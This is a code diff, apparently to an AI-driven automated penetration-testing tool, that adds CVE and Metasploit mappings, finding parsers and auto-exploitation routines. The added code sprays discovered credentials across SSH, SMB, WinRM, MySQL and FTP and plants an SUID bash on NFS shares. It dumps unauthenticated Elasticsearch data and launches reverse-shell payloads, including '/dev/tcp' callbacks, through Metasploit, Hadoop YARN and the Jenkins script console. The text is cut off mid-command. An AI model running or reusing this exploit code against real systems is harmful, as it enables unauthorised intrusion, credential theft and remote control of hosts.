@@ -694,6 +694,54 @@ VERSION_CVE_MAP = [
     # Windows OS triggers (más completos)
     (r'windows.*2000|windows.*xp|windows.*2003',445,'critical','CVE-2008-4250','MS08-067 candidato (WinXP/2003) | exploit/windows/smb/ms08_067_netapi'),
     (r'windows.*(server 2012|windows 8)',  445, 'high',     'CVE-2020-0796', 'SMBGhost candidato — exploit/windows/smb/cve_2020_0796_smbghost'),
+    # ProFTPD
+    (r'proftpd 1\.3\.5',                   21,  'critical', 'CVE-2015-3306', 'ProFTPD 1.3.5 mod_copy SITE CPFR/CPTO RCE sin auth | exploit/unix/ftp/proftpd_modcopy_exec'),
+    (r'proftpd 1\.3\.[01]',                21,  'critical', 'CVE-2010-4221', 'ProFTPD 1.3.0-1.3.1 buffer overflow | exploit/freebsd/ftp/proftp_telnet_iac'),
+    # rlogin / rexec / rsh (Berkeley R-services)
+    (r'rlogin|rsh\b',                       513, 'critical', '',              'rlogin sin auth — acceso root trivial via "rlogin -l root TARGET"'),
+    (r'rexec\b',                            512, 'critical', '',              'rexec sin auth | auxiliary/scanner/rservices/rexec_login'),
+    (r'shell\b|rsh\b',                      514, 'critical', '',              'rsh sin auth — ejecución remota sin contraseña'),
+    # Webmin versiones con backdoor / RCE conocidas
+    (r'webmin[/ ]1\.88[0-5]',              None,'critical', 'CVE-2019-15107','Webmin 1.880-1.885 RCE sin auth (backdoor) | exploit/linux/http/webmin_backdoor'),
+    (r'webmin[/ ]1\.(2|3|4|5|6|7)\.',     None,'high',     'CVE-2012-2982', 'Webmin RCE con auth | exploit/unix/webapp/webmin_show_cgi_exec'),
+    # Elasticsearch sin auth + versiones viejas
+    (r'elasticsearch[/ ]1\.',              9200,'critical', 'CVE-2014-3120', 'Elasticsearch 1.x RCE via dynamic script execution'),
+    (r'elasticsearch[/ ]2\.',              9200,'high',     '',              'Elasticsearch 2.x sin auth — acceso total a todos los índices'),
+    # CouchDB
+    (r'couchdb[/ ](1\.|2\.[01])',          5984,'critical', 'CVE-2017-12635','CouchDB Admin Party o privesc | exploit/linux/http/apache_couchdb_rce'),
+    # Hadoop YARN
+    (r'hadoop|yarn.*resourcemanager',      8088,'critical', '',              'Hadoop YARN ResourceManager RCE sin auth — REST API job submission'),
+    # NFS
+    (r'nfs|mountd',                        2049,'high',     '',              'NFS expuesto — verificar exports con no_root_squash para SUID'),
+    # OpenSSH versiones con vulns específicas
+    (r'openssh[_ ]7\.2p2',                 22,  'medium',   'CVE-2016-6210', 'OpenSSH 7.2p2 user enumeration + posible username bypass'),
+    (r'openssh[_ ](2\.|3\.|4\.|5\.)',      22,  'high',     '',              'OpenSSH antiguo — revisar user enum y integer overflow CVEs'),
+    # Tomcat versiones con PUT upload RCE
+    (r'apache.tomcat[/ ]7\.',              None,'high',     'CVE-2017-12617','Tomcat 7 PUT method enabled — posible JSP upload | exploit/multi/http/tomcat_jsp_upload_bypass'),
+    # Apache Tomcat RCE via DefaultServlet WRITE
+    (r'apache.tomcat[/ ]9\.(0\.[0-9]\.|0\.[1-3][0-9]\.)',None,'high','CVE-2019-0232','Tomcat 9.0 CGI Servlet enableCmdLineArguments RCE'),
+    # Jenkins (versiones viejas sin auth)
+    (r'jenkins[/ ]2\.(0|[1-9]\.|[1-9][0-9]\.)',None,'critical','CVE-2018-1000861','Jenkins RCE via Groovy Script Console (sin auth en versiones viejas)'),
+    # phpMyAdmin más versiones
+    (r'phpmyadmin[/ ]4\.8\.[0-7]',        None,'critical', 'CVE-2018-12613','phpMyAdmin 4.8 LFI → RCE via session file include'),
+    # WildFly / JBoss más versiones
+    (r'wildfly|jboss.*eap',               None,'high',     'CVE-2015-7501', 'JBoss/WildFly Java Deserialization RCE | exploit/multi/http/jboss_deserialization'),
+    # Shellshock via HTTP
+    (r'bash.*4\.[0-3]\.',                 None,'critical', 'CVE-2014-6271', 'Bash 4.x — Shellshock via CGI headers'),
+    # Node.js path traversal
+    (r'node\.js[/ ](12|14|16)\.',         None,'low',      '',              'Node.js — verificar prototype pollution y dependencias con CVEs'),
+    # Solr RCE
+    (r'apache solr[/ ](5\.|6\.|7\.[0-5])',None,'critical', 'CVE-2019-0193', 'Apache Solr DataImportHandler RCE | exploit/multi/http/solr_velocity_rce'),
+    # Portmap / RPC
+    (r'rpcbind|portmap',                  111, 'medium',   '',              'RPC portmapper expuesto — enumerar servicios RPC (nfs, nlockmgr, etc.)'),
+    # Finger daemon
+    (r'\bfingerd?\b',                      79,  'low',      '',              'Finger daemon — enumeración de usuarios del sistema'),
+    # IPMI
+    (r'ipmi|baseboard management',        623, 'critical',  'CVE-2013-4786','IPMI 2.0 RAKP auth bypass — hash dump sin credenciales | auxiliary/scanner/ipmi/ipmi_dumphashes'),
+    # VNC sin auth
+    (r'vnc.*authentication.*none|rfb.*0\.0',5900,'critical','',             'VNC sin autenticación — acceso directo al escritorio'),
+    # X11
+    (r'\bx11\b|xorg|x\.org',              6000,'critical',  '',             'X11 expuesto — posible captura de pantalla y keylogging via xwd/xinput'),
 ]
 
 # ── CVSS v3.1 auto-vector assignment ──────────────────────────────────────────
@@ -1700,6 +1748,134 @@ def _parse_tool_output(tool, output_text, rhost="", job_name=""):
             "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
             "description": "phpMyAdmin accesible con credenciales. Posible RCE via SELECT INTO OUTFILE webshell.",
             "evidence": "", "hosts": [rhost] if rhost else [], "source": "phpmyadmin-check",
+        })
+
+    # ── rlogin / rexec / rsh access ───────────────────────────────────────────
+    if re.search(r'rlogin.*success|rexec.*success|rsh.*uid=|r-service.*access|RLOGIN_OK', output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "R-Services — Acceso Sin Autenticación Confirmado",
+            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
+            "description": "rlogin/rexec/rsh accesible sin contraseña — acceso root trivial.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "rservices-check",
+        })
+
+    # ── NFS no_root_squash ────────────────────────────────────────────────────
+    if re.search(r'NFS_NO_ROOT_SQUASH_CONFIRMED|no_root_squash', output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "NFS — no_root_squash Confirmado (PrivEsc a Root)",
+            "severity": "critical", "status": "open", "cve": "", "cvss": 8.1,
+            "description": "NFS exporta con no_root_squash — montar y crear SUID bash permite escalar a root en el target.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "nfs-check",
+        })
+
+    # ── NFS exports reachable ─────────────────────────────────────────────────
+    if re.search(r'NFS_MOUNTED_OK|Export list for|/\w+.*\(', output_text) and "nfs" in job_name.lower():
+        exports_found = re.findall(r'(/[/\w\-]+)\s+\(', output_text)
+        if exports_found:
+            findings.append({
+                "id": str(uuid.uuid4()), "title": f"NFS — Exports Montables Sin Auth ({len(exports_found)})",
+                "severity": "high", "status": "open", "cve": "", "cvss": 6.5,
+                "description": f"NFS exports accesibles: {', '.join(exports_found[:5])}",
+                "evidence": "\n".join(exports_found[:5]),
+                "hosts": [rhost] if rhost else [], "source": "nfs-check",
+            })
+
+    # ── Jenkins accessible without auth ──────────────────────────────────────
+    if re.search(r'X-Jenkins:|Jenkins.*Accessible|/script.*200', output_text, re.IGNORECASE):
+        if re.search(r'200', output_text):
+            findings.append({
+                "id": str(uuid.uuid4()), "title": "Jenkins — Script Console Accesible Sin Auth",
+                "severity": "critical", "status": "open", "cve": "CVE-2018-1000861", "cvss": 9.8,
+                "description": "Jenkins /script accesible sin autenticación — RCE via Groovy Script Console.",
+                "evidence": "", "hosts": [rhost] if rhost else [], "source": "jenkins-check",
+            })
+
+    # ── Elasticsearch unauthenticated ─────────────────────────────────────────
+    if re.search(r'elasticsearch.*"cluster_name"|"status"\s*:\s*"(green|yellow)"', output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "Elasticsearch — Acceso Sin Autenticación",
+            "severity": "critical", "status": "open", "cve": "CVE-2014-3120", "cvss": 9.8,
+            "description": "Elasticsearch accesible sin auth — todos los índices y datos expuestos.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "elastic-check",
+        })
+
+    # ── CouchDB admin party ───────────────────────────────────────────────────
+    if re.search(r'"couchdb"\s*:\s*"Welcome"|_all_dbs|"version"\s*:\s*"[12]\.',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "CouchDB — Admin Party (Sin Autenticación)",
+            "severity": "critical", "status": "open", "cve": "CVE-2017-12635", "cvss": 9.8,
+            "description": "CouchDB accesible sin auth — acceso total a bases de datos y posible RCE.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "couchdb-check",
+        })
+
+    # ── Hadoop YARN RCE ───────────────────────────────────────────────────────
+    if re.search(r'hadoopVersion|HADOOP_YARN_RCE|resourcemanager.*state.*RUNNING',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "Hadoop YARN — RCE Sin Autenticación",
+            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
+            "description": "Hadoop YARN ResourceManager accesible sin auth — job submission permite RCE.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "hadoop-yarn",
+        })
+
+    # ── VNC no auth ───────────────────────────────────────────────────────────
+    if re.search(r'Authentication.*None|vnc.*no.*auth|rfb.*\|.*None required|security type.*1.*\bnone\b',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "VNC — Sin Autenticación (Acceso Directo al Escritorio)",
+            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
+            "description": "VNC accesible sin contraseña — control total del escritorio remoto.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "vnc-check",
+        })
+
+    # ── X11 open ──────────────────────────────────────────────────────────────
+    if re.search(r'X11_OPEN|screen.*dimensions|number of screens|xdpyinfo.*display',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "X11 — Display Expuesto Sin Control de Acceso",
+            "severity": "critical", "status": "open", "cve": "", "cvss": 9.0,
+            "description": "X11 display accesible remotamente — captura de pantalla, keylogging y toma de control posible.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "x11-check",
+        })
+
+    # ── IPMI hash leaked ──────────────────────────────────────────────────────
+    if re.search(r'IPMI.*Hash|rakp.*hash|ipmi.*\$rakp', output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "IPMI — Hash RAKP Extraído Sin Auth",
+            "severity": "critical", "status": "open", "cve": "CVE-2013-4786", "cvss": 9.8,
+            "description": "IPMI 2.0 permite extraer hashes RAKP sin autenticación — crackear offline con hashcat.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "ipmi-check",
+        })
+
+    # ── ProFTPD mod_copy RCE ──────────────────────────────────────────────────
+    if re.search(r'proftpd.*mod_copy|SITE CPFR.*SITE CPTO|proftpd.*rce.*confirm',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "ProFTPD mod_copy — RCE Confirmado (CVE-2015-3306)",
+            "severity": "critical", "status": "open", "cve": "CVE-2015-3306", "cvss": 10.0,
+            "description": "ProFTPD 1.3.5 mod_copy permite SITE CPFR/CPTO sin auth — copiar archivos arbitrarios → webshell.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "proftpd-check",
+        })
+
+    # ── Webmin backdoor ───────────────────────────────────────────────────────
+    if re.search(r'webmin.*backdoor|webmin.*rce.*confirm|Webmin.*cmd.*uid=',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "Webmin — Backdoor RCE Sin Auth (CVE-2019-15107)",
+            "severity": "critical", "status": "open", "cve": "CVE-2019-15107", "cvss": 9.8,
+            "description": "Webmin 1.882-1.921 tiene backdoor — RCE sin autenticación via password_change.cgi.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "webmin-check",
+        })
+
+    # ── MySQL webshell written ────────────────────────────────────────────────
+    if re.search(r'MYSQL_WEBSHELL_WRITTEN|INTO OUTFILE.*\.php|File.*created.*\.php',
+                  output_text, re.IGNORECASE):
+        findings.append({
+            "id": str(uuid.uuid4()), "title": "MySQL — Webshell Escrita via SELECT INTO OUTFILE",
+            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
+            "description": "MySQL root sin password + FILE privilege — webshell PHP escrita en webroot.",
+            "evidence": "", "hosts": [rhost] if rhost else [], "source": "mysql-exploit",
         })
 
     # ── RDP BlueKeep ─────────────────────────────────────────────────────────
@@ -6778,6 +6954,81 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
         except Exception:
             pass
 
+    def _credential_chain(self, target, open_ports, creds, accumulated_output):
+        """Take found credentials and try them against every applicable service."""
+        if not creds:
+            return
+        port_set = {p["port"] for p in open_ports}
+        for cred in creds[:10]:
+            if ":" not in cred:
+                continue
+            user, pwd = cred.split(":", 1)
+            self._log(f"[Claude] CRED-CHAIN {user}:{pwd[:4]}*** → probando en {len(port_set)} servicios")
+            MEMORY.remember_cred(target, "found", user, pwd)
+            # SSH
+            if 22 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-ssh-{user}",
+                    f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                    f"-o BatchMode=no {user}@{target} "
+                    f"'id; whoami; uname -a; cat /etc/passwd; sudo -l 2>/dev/null; "
+                    f"find / -perm -4000 -type f 2>/dev/null | head -15; "
+                    f"cat ~/user.txt ~/flag.txt /root/root.txt 2>/dev/null' 2>/dev/null",
+                    target, timeout=30,
+                )
+                self._capture_evidence(out, target, f"cred-ssh-{user}", f"ssh {user}@{target}")
+                if "uid=" in out or "permission denied" not in out.lower():
+                    accumulated_output.append(f"=== SSH {user} ===\n{out[:600]}")
+            # SMB
+            if 445 in port_set or 139 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-smb-{user}",
+                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' --shares 2>/dev/null | head -20",
+                    target, timeout=20,
+                )
+                self._capture_evidence(out, target, f"cred-smb-{user}", f"cmx smb {user}")
+                if "+" in out or "pwn3d" in out.lower():
+                    accumulated_output.append(f"=== SMB {user} ===\n{out[:400]}")
+            # WinRM
+            if 5985 in port_set or 5986 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-winrm-{user}",
+                    f"crackmapexec winrm {target} -u '{user}' -p '{pwd}' 2>/dev/null | head -10",
+                    target, timeout=20,
+                )
+                self._capture_evidence(out, target, f"cred-winrm-{user}", f"winrm {user}")
+                if "+" in out or "pwn3d" in out.lower():
+                    accumulated_output.append(f"=== WinRM {user} ===\n{out[:400]}")
+                    # If WinRM works, get a full shell
+                    shell_out, _ = self._run_cmd(
+                        f"evil-winrm-{user}",
+                        f"evil-winrm -i {target} -u '{user}' -p '{pwd}' "
+                        f"-e 'cmd /c id & cmd /c whoami & cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -20",
+                        target, timeout=40,
+                    )
+                    self._capture_evidence(shell_out, target, f"evil-winrm-{user}", "evil-winrm")
+            # MySQL
+            if 3306 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-mysql-{user}",
+                    f"mysql -h {target} -u '{user}' -p'{pwd}' -e 'show databases; select user,host from mysql.user;' 2>/dev/null | head -20",
+                    target, timeout=15,
+                )
+                if "database" in out.lower():
+                    accumulated_output.append(f"=== MySQL {user} ===\n{out[:400]}")
+            # FTP
+            if 21 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-ftp-{user}",
+                    f"timeout 15 ftp -n {target} <<'FTPEOF'\nuser {user} {pwd}\nls -la\nget user.txt /tmp/ftp_{target.replace('.','_')}_{user}_user.txt\nget root.txt /tmp/ftp_{target.replace('.','_')}_{user}_root.txt\nquit\nFTPEOF\n2>/dev/null; "
+                    f"cat /tmp/ftp_{target.replace('.','_')}_{user}_user.txt 2>/dev/null; "
+                    f"cat /tmp/ftp_{target.replace('.','_')}_{user}_root.txt 2>/dev/null",
+                    target, timeout=20,
+                )
+                self._capture_evidence(out, target, f"cred-ftp-{user}", f"ftp {user}")
+                if "230" in out or out.strip():
+                    accumulated_output.append(f"=== FTP {user} ===\n{out[:400]}")
+
     def _run_kb_phase(self, target, open_ports, accumulated_output):
         """Run highest-priority KB commands for each discovered service."""
         for p in open_ports[:15]:
@@ -6787,16 +7038,28 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             svc = p["service"].lower()
             ver = p["version"].lower()
             kb = _kb_commands(port_num, svc, ver, target, self.mode)
-            # Only run the 3 highest-priority commands per service (lower number = higher priority)
-            priority_cmds = sorted([c for c in kb if c[0] <= 20], key=lambda x: x[0])[:3]
+            # Run top-5 highest-priority commands per service (priority ≤ 28)
+            priority_cmds = sorted([c for c in kb if c[0] <= 28], key=lambda x: x[0])[:5]
             for pri, name, cmd in priority_cmds:
                 if not self._running:
                     break
                 self._log(f"[Claude] KB {name}")
-                out, _ = self._run_cmd(name, cmd, target, timeout=120)
+                out, _ = self._run_cmd(name, cmd, target, timeout=150)
                 parsed = _parse_tool_output(name.split(":")[0].lower(), out, target, name)
                 if parsed.get("findings"):
                     self._save_findings(parsed["findings"], target)
+                # Extract credentials from output and chain them
+                creds_found = re.findall(
+                    r'(?:TOMCAT_CREDS_VALID|HYDRA_CRED|Hydra.*login:|valid.*credentials?)[:\s]+(\S+:\S+)',
+                    out, re.IGNORECASE,
+                )
+                creds_found += re.findall(
+                    r'(?:\[\+\].*|Pwn3d!.*?)(\w+):(\w+)', out
+                )[:3]
+                flat_creds = [f"{c[0]}:{c[1]}" if isinstance(c, tuple) else c for c in creds_found]
+                if flat_creds:
+                    self._log(f"[Claude] KB CREDS encontradas en {name}: {flat_creds[:3]}")
+                    self._credential_chain(target, open_ports, flat_creds, accumulated_output)
                 if out.strip():
                     accumulated_output.append(f"=== {name} ===\n{out[:900]}")
 
@@ -6927,6 +7190,257 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                     self._capture_evidence(ws_out, target, "mysql-webshell", "mysql into outfile")
                     accumulated_output.append(f"=== MySQL Empty Root ===\n{out[:400]}\n{ws_out[:400]}")
 
+            # ── ProFTPD 1.3.5 mod_copy RCE ───────────────────────────────
+            if (port_num == 21 or "ftp" in svc) and "proftpd" in ver and "1.3.5" in ver:
+                self._log(f"[Claude] AUTO-EXPLOIT: ProFTPD 1.3.5 mod_copy!")
+                out, _ = self._run_cmd(
+                    "proftpd-modcopy",
+                    f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; "
+                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 12; exit' 2>/dev/null",
+                    target, timeout=60,
+                )
+                self._capture_evidence(out, target, "proftpd-modcopy", "proftpd_modcopy_exec")
+                accumulated_output.append(f"=== ProFTPD EXPLOIT ===\n{out[:600]}")
+
+            # ── rlogin / rexec / rsh (Berkeley R-services) ───────────────
+            if port_num in (512, 513, 514) or svc in ("rlogin", "rexec", "shell", "rsh"):
+                self._log(f"[Claude] AUTO-EXPLOIT: R-services sin auth (puerto {port_num})!")
+                if port_num == 513 or "rlogin" in svc:
+                    out, _ = self._run_cmd(
+                        "rlogin-noauth",
+                        f"rlogin -l root {target} -n 2>/dev/null <<'EOF'\nid\nwhoami\ncat /etc/passwd\ncat /root/root.txt 2>/dev/null\nEOF\n || "
+                        f"msfconsole -q -x 'use auxiliary/scanner/rservices/rlogin_login; "
+                        f"set RHOSTS {target}; set USERNAME root; set PASSWORD \"\"; run; exit' 2>/dev/null",
+                        target, timeout=30,
+                    )
+                    self._capture_evidence(out, target, "rlogin-noauth", "rlogin -l root")
+                    accumulated_output.append(f"=== rlogin ===\n{out[:500]}")
+                if port_num == 512 or "rexec" in svc:
+                    out, _ = self._run_cmd(
+                        "rexec-noauth",
+                        f"msfconsole -q -x 'use auxiliary/scanner/rservices/rexec_login; "
+                        f"set RHOSTS {target}; set USERNAME root; set PASSWORD \"\"; run; exit' 2>/dev/null",
+                        target, timeout=30,
+                    )
+                    self._capture_evidence(out, target, "rexec-noauth", "rexec auxiliary")
+                if port_num == 514 or svc in ("shell", "rsh"):
+                    out, _ = self._run_cmd(
+                        "rsh-noauth",
+                        f"rsh {target} -l root 'id; cat /etc/passwd; cat /root/root.txt 2>/dev/null' 2>/dev/null || "
+                        f"msfconsole -q -x 'use auxiliary/scanner/rservices/rsh_login; "
+                        f"set RHOSTS {target}; set USERNAME root; set PASSWORD \"\"; run; exit' 2>/dev/null",
+                        target, timeout=30,
+                    )
+                    self._capture_evidence(out, target, "rsh-noauth", "rsh -l root")
+                    accumulated_output.append(f"=== rsh ===\n{out[:500]}")
+
+            # ── Webmin backdoor (CVE-2019-15107) ─────────────────────────
+            if ("webmin" in ver or "webmin" in svc) and any(v in ver for v in ["1.88", "1.900", "1.91"]):
+                self._log(f"[Claude] AUTO-EXPLOIT: Webmin backdoor CVE-2019-15107!")
+                out, _ = self._run_cmd(
+                    "webmin-backdoor",
+                    f"msfconsole -q -x 'use exploit/linux/http/webmin_backdoor; "
+                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set SSL true; set PAYLOAD cmd/unix/reverse_netcat; run; sleep 12; exit' 2>/dev/null",
+                    target, timeout=60,
+                )
+                self._capture_evidence(out, target, "webmin-backdoor", "webmin_backdoor")
+                accumulated_output.append(f"=== Webmin EXPLOIT ===\n{out[:600]}")
+
+            # ── NFS no_root_squash → SUID bash ───────────────────────────
+            if port_num == 2049 or "nfs" in svc or "mountd" in svc:
+                out, _ = self._run_cmd(
+                    "nfs-enum",
+                    f"showmount -e {target} 2>/dev/null",
+                    target, timeout=15,
+                )
+                accumulated_output.append(f"=== NFS Exports ===\n{out[:400]}")
+                if out.strip():
+                    # Parse exported paths
+                    exports = re.findall(r'(/[^\s]+)', out)
+                    for export_path in exports[:3]:
+                        self._log(f"[Claude] NFS export {export_path} → montando para no_root_squash check")
+                        rce_out, _ = self._run_cmd(
+                            f"nfs-mount-{export_path.replace('/','_')}",
+                            f"MNTDIR=$(mktemp -d); "
+                            f"mount -t nfs -o nolock {target}:{export_path} $MNTDIR 2>/dev/null && echo 'NFS_MOUNTED_OK' && "
+                            f"ls -la $MNTDIR 2>/dev/null | head -20; "
+                            f"cat $MNTDIR/root/root.txt 2>/dev/null; "
+                            f"cat $MNTDIR/home/*/user.txt 2>/dev/null | head -5; "
+                            f"# Check no_root_squash: if we can write as root, this is critical\n"
+                            f"cp /bin/bash $MNTDIR/bash_suid 2>/dev/null && chmod +s $MNTDIR/bash_suid 2>/dev/null && "
+                            f"echo 'NFS_NO_ROOT_SQUASH_CONFIRMED' || echo 'root_squash_active'; "
+                            f"umount $MNTDIR 2>/dev/null; rmdir $MNTDIR 2>/dev/null",
+                            target, timeout=30,
+                        )
+                        self._capture_evidence(rce_out, target, "nfs-no_root_squash", f"nfs mount {export_path}")
+                        accumulated_output.append(f"=== NFS Mount {export_path} ===\n{rce_out[:600]}")
+
+            # ── Elasticsearch no-auth data dump ──────────────────────────
+            if port_num == 9200 or "elasticsearch" in svc or "elastic" in svc:
+                out, _ = self._run_cmd(
+                    "elastic-noauth",
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/_cat/indices?v' 2>/dev/null | head -20; "
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/_cluster/health?pretty' 2>/dev/null | head -10; "
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/_nodes?pretty' 2>/dev/null | grep -E 'name|version|ip' | head -10",
+                    target, timeout=20,
+                )
+                if "indices" in out.lower() or "cluster" in out.lower() or "green" in out or "yellow" in out:
+                    self._log(f"[Claude] Elasticsearch sin auth → volcando datos!")
+                    dump_out, _ = self._run_cmd(
+                        "elastic-dump",
+                        f"# Dump first 5 records from each index\n"
+                        f"INDICES=$(curl -s --max-time 10 'http://{target}:{port_num}/_cat/indices' 2>/dev/null | awk '{{print $3}}' | head -5); "
+                        f"for idx in $INDICES; do "
+                        f"echo \"=== Index: $idx ===\"; "
+                        f"curl -s --max-time 10 'http://{target}:{port_num}/'$idx'/_search?size=5&pretty' 2>/dev/null | "
+                        f"python3 -c 'import json,sys; d=json.load(sys.stdin); "
+                        f"[print(json.dumps(h[\"_source\"],indent=2)[:500]) for h in d.get(\"hits\",{{}}).get(\"hits\",[])[:3]]' 2>/dev/null | head -30; "
+                        f"done",
+                        target, timeout=30,
+                    )
+                    accumulated_output.append(f"=== Elasticsearch ===\n{out[:400]}\n{dump_out[:800]}")
+                    # Save as finding
+                    if out.strip():
+                        self._save_findings([{
+                            "title": f"Elasticsearch Sin Autenticación @ {target}:{port_num}",
+                            "severity": "critical", "description":
+                            f"Elasticsearch accesible sin auth. Índices expuestos:\n{out[:300]}",
+                            "cve": "CVE-2014-3120",
+                        }], target)
+
+            # ── CouchDB Admin Party ───────────────────────────────────────
+            if port_num == 5984 or "couchdb" in svc:
+                out, _ = self._run_cmd(
+                    "couchdb-noauth",
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/' 2>/dev/null; "
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/_all_dbs' 2>/dev/null; "
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/_users/_all_docs' 2>/dev/null | head -20",
+                    target, timeout=20,
+                )
+                if "couchdb" in out.lower() or "_all_dbs" in out or "[" in out:
+                    self._log(f"[Claude] CouchDB sin auth → intentando RCE!")
+                    rce_out, _ = self._run_cmd(
+                        "couchdb-rce",
+                        f"msfconsole -q -x 'use exploit/linux/http/apache_couchdb_rce; "
+                        f"set RHOSTS {target}; set RPORT {port_num}; "
+                        f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                        f"set PAYLOAD linux/x64/shell_reverse_tcp; run; sleep 12; exit' 2>/dev/null",
+                        target, timeout=60,
+                    )
+                    self._capture_evidence(rce_out, target, "couchdb-rce", "couchdb_rce")
+                    accumulated_output.append(f"=== CouchDB ===\n{out[:400]}\n{rce_out[:400]}")
+
+            # ── Hadoop YARN RCE ───────────────────────────────────────────
+            if port_num in (8088, 8090) or "hadoop" in svc or "yarn" in svc:
+                out, _ = self._run_cmd(
+                    "hadoop-yarn-rce",
+                    f"curl -s --max-time 10 'http://{target}:{port_num}/ws/v1/cluster/info' 2>/dev/null | head -5; "
+                    f"# Hadoop YARN RCE via application submission\n"
+                    f"curl -s --max-time 15 -X POST 'http://{target}:{port_num}/ws/v1/cluster/apps/new-application' 2>/dev/null | head -5",
+                    target, timeout=30,
+                )
+                if "hadoopVersion" in out or "resourceManager" in out or "application" in out.lower():
+                    self._log(f"[Claude] Hadoop YARN sin auth → RCE via job submission!")
+                    rce_out, _ = self._run_cmd(
+                        "hadoop-yarn-job-rce",
+                        f"python3 - <<'PYEOF'\nimport urllib.request, json, uuid\n"
+                        f"base='http://{target}:{port_num}/ws/v1/cluster'\n"
+                        f"app_id=json.loads(urllib.request.urlopen(base+'/apps/new-application',b'',timeout=10).read())['application-id']\n"
+                        f"cmd='bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1'\n"
+                        f"payload=json.dumps({{'application-id':app_id,'application-name':'pwn','application-type':'YARN','am-container-spec':{{'commands':{{'command':f'/bin/bash -c \"{cmd}\"'}}}},'resource':{{'memory':512,'vCores':1}},'priority':{{'priority':1}},'unmanaged-AM':False}}}).encode()\n"
+                        f"req=urllib.request.Request(base+'/apps',payload,{{'Content-Type':'application/json'}})\n"
+                        f"print(urllib.request.urlopen(req,timeout=15).read()[:200])\n"
+                        f"PYEOF\n2>/dev/null",
+                        target, timeout=30,
+                    )
+                    self._capture_evidence(rce_out, target, "hadoop-yarn-rce", "yarn job submission")
+                    accumulated_output.append(f"=== Hadoop YARN ===\n{rce_out[:600]}")
+
+            # ── Jenkins no-auth Groovy RCE ────────────────────────────────
+            if port_num in (8080, 8443, 8888) or "jenkins" in ver:
+                out, _ = self._run_cmd(
+                    "jenkins-detect",
+                    f"curl -s -I --max-time 8 'http://{target}:{port_num}/' 2>/dev/null | grep -i 'x-jenkins\\|jenkins'; "
+                    f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 8 'http://{target}:{port_num}/script' 2>/dev/null",
+                    target, timeout=15,
+                )
+                if "x-jenkins" in out.lower() or "200" in out:
+                    if "200" in out:  # /script accessible without auth
+                        self._log(f"[Claude] Jenkins /script accesible sin auth → RCE!")
+                        rce_out, _ = self._run_cmd(
+                            "jenkins-groovy-rce",
+                            f"curl -s --max-time 15 -X POST 'http://{target}:{port_num}/scriptText' "
+                            f"--data 'script=println(\"id\".execute().text+\"\\n\"+\"hostname\".execute().text+\"\\n\"+\"cat /etc/passwd\".execute().text)' "
+                            f"2>/dev/null | head -10; "
+                            f"curl -s --max-time 15 -X POST 'http://{target}:{port_num}/scriptText' "
+                            f"--data 'script=[\"bash\",\"-c\",\"bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\"].execute()' "
+                            f"2>/dev/null | head -5",
+                            target, timeout=30,
+                        )
+                        self._capture_evidence(rce_out, target, "jenkins-groovy-rce", "jenkins scriptText")
+                        accumulated_output.append(f"=== Jenkins RCE ===\n{out[:200]}\n{rce_out[:600]}")
+
+            # ── Shellshock via HTTP CGI ───────────────────────────────────
+            if "http" in svc or port_num in (80, 443, 8080, 8443):
+                out, _ = self._run_cmd(
+                    f"shellshock-cgi-{port_num}",
+                    f"for cgi in /cgi-bin/test.cgi /cgi-bin/admin.cgi /cgi-bin/login.cgi /cgi-bin/status /cgi-bin/printenv; do "
